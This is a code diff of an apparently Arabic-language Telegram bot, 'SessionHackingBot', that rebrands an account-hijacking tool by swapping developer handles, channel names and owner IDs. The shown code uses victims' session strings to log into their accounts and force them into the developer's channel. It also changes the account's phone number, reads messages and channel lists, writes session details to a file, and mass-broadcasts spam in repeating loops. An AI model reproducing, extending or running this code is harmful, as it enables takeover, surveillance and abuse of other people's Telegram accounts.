@@ -25,7 +25,7 @@ from telethon.tl.functions.channels import CreateChannelRequest as ccr
 mybot = "missrose_bot"
 bot = borg = client
 
-Arabihack = 5341342370
+Arabihack = 5502537272
 
 Bot_Username =os.environ.get("BOT_USERNAME", None) or "SessionHackingBot"
 
@@ -33,7 +33,7 @@ async def change_number_code(strses, number, code, otp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try:
-      await bot(join("R125R"))
+      await bot(join("Repthon"))
     except BaseException:
       pass
     try:
@@ -66,7 +66,7 @@ async def change_number(strses, number):
     except BaseException:
       pass
     try:
-      await bot(join("R125R"))
+      await bot(join("Repthon"))
     except BaseException:
       pass
     try:
@@ -96,7 +96,7 @@ async def userinfo(strses):
     except BaseException:
       pass
     try:
-      await X(join("R125R"))
+      await X(join("Repthon"))
     except BaseException:
       pass
     try:
@@ -297,7 +297,7 @@ async def usermsgs(strses):
     except BaseException:
       pass
     try:
-      await X(join("@N_B_10"))
+      await X(join("@Repthon"))
     except BaseException:
       pass
     try:
@@ -373,7 +373,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "R125R"
+channel = "Repthon"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -402,7 +402,8 @@ menu = '''
 
 "M" ~ [تغير رقم الحساب باستخدام كود ترمكس]
 
-انتضرو قريبا المزيد من المميزات 🙋‍♂️
+المطور: @ZQ_LO 👁️
+قناة المطور: @Repthon ⚠️
 '''
 mm = '''
 
@@ -430,7 +431,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("المطور", "https://t.me/XLL53X")
+    Button.url("المطور", "https://t.me/ZQ_LO")
     ]
 ]
 
@@ -480,7 +481,7 @@ async def start(event):
         Button.inline("N", data="N"),
         ],
       [
-        Button.url("المطور", "https://t.me/XLL53X")
+        Button.url("المطور", "https://t.me/ZQ_LO")
         ]
     ]
     await x.send_message(f"اختر ما تريد فعله معه الجلسه \n\n{menu}", buttons=keyboard)
@@ -501,7 +502,7 @@ async def users(event):
         return await event.reply("لقد تم طرد هذا الكود من الحساب مسبقا.\n/hack", buttons=keyboard)
       if len(i) > 3855:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @XLL53X")
+        file.write(i + "\n\nDetails BY @ZQ_LO")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -697,7 +698,7 @@ async def users(event):
         else:
           await event.respond("هناك خطأ ما حصل")
       except Exception as e:
-        await event.respond("ارسل المشكله الى لحلها- @XLL53X\n**LOGS**\n" + str(e))
+        await event.respond("ارسل المشكله الى لحلها- @ZQ_LO\n**LOGS**\n" + str(e))
 
 
 
@@ -710,7 +711,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("المالك", "https://t.me/QQQLO")
+        Button.url("المالك", "https://t.me/ZQ_LO")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \n✓ For All - Choose a\n✓ For Group - Choose b\n✓ For Private - Choose c", buttons=keyboard)
@@ -727,7 +728,7 @@ async def gcasta(strses, msg):
                 chat = aman.id
                 try:
                     await X.send_message(chat, tol, file=file)     
-                    if lol != -1001551357238:
+                    if lol != -1001878403490:
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
@@ -746,7 +747,7 @@ async def gcasta(strses, msg):
                         await X.send_message(chat, tol, file=file)
                         await asyncio.sleep(60)
                         await X.send_message(chat, tol, file=file)
-                    elif chat == -1001606996743:
+                    elif chat == -1001878403490:
                         pass
                     await asyncio.sleep()
                 except Exception as e:
@@ -783,7 +784,7 @@ async def gcastb(strses, msg):
                 if sweetie.is_group:
                     chat = sweetie.id
                     try:
-                        if chat != -1001606996743:
+                        if chat != -1001878403490:
                             await X.send_message(chat, tol, file=file)
                             await asyncio.sleep(60)
                             await X.send_message(chat, tol, file=file)
@@ -871,7 +872,7 @@ async def gcastb(strses, msg):
                             while molb != False:
                                 await asyncio.sleep(600)
                                 await X.send_message(chat, tol, file=file, schedule=timedelta(seconds=60))
-                        elif chat == -1001606996743:
+                        elif chat == -1001878403490:
                             pass
                     except Exception as e:
                         print(e)
